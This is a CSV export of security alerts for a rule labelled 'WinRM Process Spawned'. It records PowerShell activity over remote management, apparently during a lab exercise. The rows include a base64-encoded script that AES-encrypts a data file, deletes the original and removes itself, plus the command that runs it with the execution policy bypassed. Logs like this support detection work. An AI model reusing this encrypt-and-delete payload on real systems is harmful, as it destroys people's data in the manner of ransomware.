      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-12-02T16:21:49.029+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-12-02T16:21:49.038+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-12-02T16:21:49.263+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:49.270+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-12-02T16:21:49.481+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:49.633+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:21:49.776+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:26:02.172+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:26:43.317+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat encrypt.ps1
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.437+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\System32\wsmprovhost.exe
C:\Windows\System32\wsmprovhost.exe","null
null","null
null"
"2025-12-02T16:27:06.573+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_l0ds2gj4.hv3.ps1
C:\Users\Thanh\AppData\Local\Temp\__PSScriptPolicyTest_l0ds2gj4.hv3.ps1","null
null"
"2025-12-02T16:27:06.852+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$hash_file = @{
  ""e270daecb216ec6241a2fa0e4b1c3ab3076b83e4"" = @{
    ""target"" = ""C:\Program Files\encrypt.ps1"";
    ""src_basename"" = ""encrypt.ps1"";
    ""dst"" = ""C:\Program Files\encrypt.ps1""
  }
}

Function Cleanup($disposable) {
  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
    $disposable.Dispose()
  }
}

Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}

Function Get-SHA1Sum($src) {
  Try {
    $c = [System.Security.Cryptography.SHA1]::Create()
    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
  } 
  Finally {
    Cleanup $c
    Cleanup $in
  }
}

Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}

Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.857+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}
Function Check-Files($h) {
  return $h.GetEnumerator() | ForEach-Object {
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
}"
"2025-12-02T16:27:06.872+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }
{
    $dst = Unresolve-Path $_.Value.target
    $dst_changed = $false
    if(Test-Path $dst -PathType Container) {
      $dst_changed = $true
      $dst = Join-Path $dst $_.Value.src_basename
    }
    New-Object psobject -Property @{
      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
      src_sha1 = ($sMd5 = $_.Key)
      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
      verifies = if ($dirty -eq $false) { $true } else { $false }
      target_is_folder = $dst_changed
    }
  }"
"2025-12-02T16:27:06.879+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}
Function Unresolve-Path($path) {
  if ($path -eq $null) {
    return $null
  }
  else {
    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
  }
}"
"2025-12-02T16:27:06.991+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
            $parent = Split-Path $to
            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
                $to,
                [system.io.filemode]::Create,
                [System.io.FileAccess]::Write,
                [System.IO.FileShare]::ReadWrite
            )
            # Powershell caches ScrpitBlocks in a dictionary
            # keyed on the script block text. Thats just great
            # unless the script is super large and called a gillion
            # times like we might do. In such a case it will saturate the
            # Large Object Heap and lead to Out Of Memory exceptions
            # for large files or folders. So we call the internal method
            # ClearScriptBlockCache to clear it.
            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:06.998+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","C:\Windows\system32\wsmprovhost.exe
C:\Windows\system32\wsmprovhost.exe","C:\Program Files\encrypt.ps1
C:\Program Files\encrypt.ps1","null
null"
"2025-12-02T16:27:07.064+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
            if($method) { $method.Invoke($Null, $Null) }
            $bytes=[Convert]::FromBase64String('CnBhcmFtICgKCiAgICBbc3RyaW5nXSRQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcZGF0YV9pbXBvcnRhbnQudHh0IiwKCiAgICBbc3RyaW5nXSRLZXlCYXNlNjQgPSAieElzOXpBK1UxajIvcVc0YjVyNnQ3eTh1OWkwbzFwMmEzczRkNWY2ZzdoOD0iLCAKCiAgICBbc3RyaW5nXSRJVkJhc2U2NCAgPSAiMWEyYjNjNGQ1ZTZmN2c4aDlpMGoxaz09IgoKKQoKCgp0cnkgewoKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7IHRocm93ICJUYXJnZXQgbWlzc2luZyIgfQoKCgogICAgJEFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCgogICAgJEFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQwoKICAgICRBZXMuUGFkZGluZyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlBhZGRpbmdNb2RlXTo6UEtDUzcKCiAgICAkQWVzLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJEtleUJhc2U2NCkKCiAgICAkQWVzLklWICA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJElWQmFzZTY0KQoKCgogICAgJEJ5dGVzID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRQYXRoKQoKCgogICAgJEVuY3J5cHRvciA9ICRBZXMuQ3JlYXRlRW5jcnlwdG9yKCkKCiAgICAkRW5jcnlwdGVkQnl0ZXMgPSAkRW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJEJ5dGVzLCAwLCAkQnl0ZXMuTGVuZ3RoKQoKCgogICAgJERlc3RGaWxlID0gJFBhdGggKyAiLmFlcyIKCiAgICBbU3lzdGVtLklPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCREZXN0RmlsZSwgJEVuY3J5cHRlZEJ5dGVzKQoKCgogICAgUmVtb3ZlLUl0ZW0gLVBhdGggJFBhdGggLUZvcmNlCgogICAgV3JpdGUtSG9zdCAiWytdIEZpbGUgRW5jcnlwdGVkOiAkRGVzdEZpbGUiCgogICAgCgp9CgpjYXRjaCB7IFdyaXRlLUVycm9yICRfIH0KCmZpbmFsbHkgewoKICAgIFJlbW92ZS1JdGVtIC1QYXRoICRNeUludm9jYXRpb24uTXlDb21tYW5kLlBhdGggLUZvcmNlCgp9Cg==')
            $fileStream.Write($bytes, 0, $bytes.length)

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:27:07.106+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
$fileStream.Dispose()
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:28:20.317+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
Rename-Item ""C:\Program Files\data_improtant.txt"" ""data_important.txt""

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
"2025-12-02T16:28:46.658+0000","2. WinRM Process Spawned","DESKTOP-00OJS0K
DESKTOP-00OJS0K",,"null
null","null
null","null
null","cat data_important.txt.aes

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
cat data_important.txt.aes

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
